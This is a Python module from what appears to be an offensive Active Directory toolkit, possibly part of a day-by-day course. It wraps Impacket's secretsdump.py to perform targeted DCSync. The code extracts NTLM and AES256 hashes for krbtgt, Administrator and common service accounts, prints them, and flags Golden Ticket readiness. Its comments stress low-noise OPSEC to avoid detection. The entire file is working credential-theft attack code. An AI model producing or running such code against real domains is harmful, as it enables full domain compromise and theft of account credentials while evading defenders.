"""
Targeted DCSync — Surgical extraction of specific accounts.

OPSEC: Generates minimal replication traffic. Each user produces
one DRSGetNCChanges request — much harder to detect than a full dump.
"""

import subprocess
from pathlib import Path
from typing import Dict, List

from ..core.auth import AuthBuilder
from ..core.parser import SecretsDumpParser


class TargetedDCSync:
    """DCSync specific high-value accounts with minimal noise."""

    HIGH_VALUE_KEYWORDS = [
        "krbtgt", "administrator", "admin",
        "svc_", "service", "backup", "sql",
        "exchange", "adfs", "aad", "sccm",
    ]

    def __init__(self, auth: AuthBuilder, output_dir: Path):
        self.auth = auth
        self.output_dir = output_dir
        self.parser = SecretsDumpParser()

    def extract(self, target_users: List[str]) -> Dict[str, dict]:
        """
        DCSync specific accounts. Returns dict mapping username → parsed creds.
        """
        print(f"\n{'=' * 60}")
        print("TARGETED DCSYNC — SURGICAL EXTRACTION")
        print(f"{'=' * 60}")
        print(f"[*] Targets: {len(target_users)} accounts")
        print(f"[*] OPSEC: Minimal replication requests")

        results: Dict[str, dict] = {}

        auth_args = self.auth.build()
        if not auth_args:
            return results

        for user in target_users:
            parsed = self._extract_user(user, auth_args)
            if parsed:
                results[user] = parsed
                self._print_result(user, parsed)

        print(f"\n[+] Targeted DCSync complete: {len(results)}/{len(target_users)} extracted")
        return results

    def extract_high_value(self) -> Dict[str, dict]:
        """DCSync the most operationally valuable accounts."""
        print("\n[*] Targeting high-value accounts...")

        hv_targets = ["krbtgt", "Administrator"]
        common_svc = [
            "svc_sql", "svc_backup", "svc_exchange", "svc_adfs",
            "svc_sccm", "svc_web", "sqlservice", "backupadmin",
        ]

        print(f"[*] Priority targets: {hv_targets}")
        print(f"[*] Common service accounts to try: {common_svc}")
        print(f"[*] TIP: Use Day 22 enumeration data for actual account names")

        return self.extract(hv_targets)

    def is_high_value(self, username: str) -> bool:
        return any(kw in username.lower() for kw in self.HIGH_VALUE_KEYWORDS)

    def _extract_user(self, user: str, auth_args: List[str]) -> dict:
        """Run secretsdump.py for a single user."""
        print(f"\n[*] DCSync target: {user}")

        output_prefix = str(self.output_dir / f"dcsync_{user}")
        cmd = ["secretsdump.py"] + auth_args + [
            "-just-dc-user", user,
            "-outputfile", output_prefix,
        ]

        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=60
            )

            if result.returncode == 0 and result.stdout:
                return self.parser.parse_user(result.stdout, user)

            print(f"    [-] Failed — check permissions")
            if "rpc_s_access_denied" in str(result.stderr).lower():
                print(f"    [-] Access denied — account lacks DCSync rights")
            elif result.stderr:
                print(f"    [-] Error: {result.stderr[:200]}")

        except FileNotFoundError:
            print("[-] secretsdump.py not found — install Impacket")
        except subprocess.TimeoutExpired:
            print(f"    [-] Timeout for {user}")
        except Exception as e:
            print(f"    [-] Error: {e}")

        return {}

    @staticmethod
    def _print_result(user: str, parsed: dict):
        """Print extraction result for a single user."""
        is_krbtgt = user.lower() == "krbtgt"

        if is_krbtgt:
            print(f"    [!] ★ KRBTGT MATERIAL EXTRACTED ★")
            print(f"    [!] NTLM:   {parsed.get('ntlm', 'N/A')}")
            aes = parsed.get("aes256", "N/A")
            print(f"    [!] AES256:  {aes[:20]}..." if len(aes) > 20 else f"    [!] AES256:  {aes}")
            print(f"    [!] Golden Ticket: READY")

        print(f"    [+] NTLM: {parsed.get('ntlm', 'N/A')}")
        print(f"    [+] RID:  {parsed.get('rid', 'N/A')}")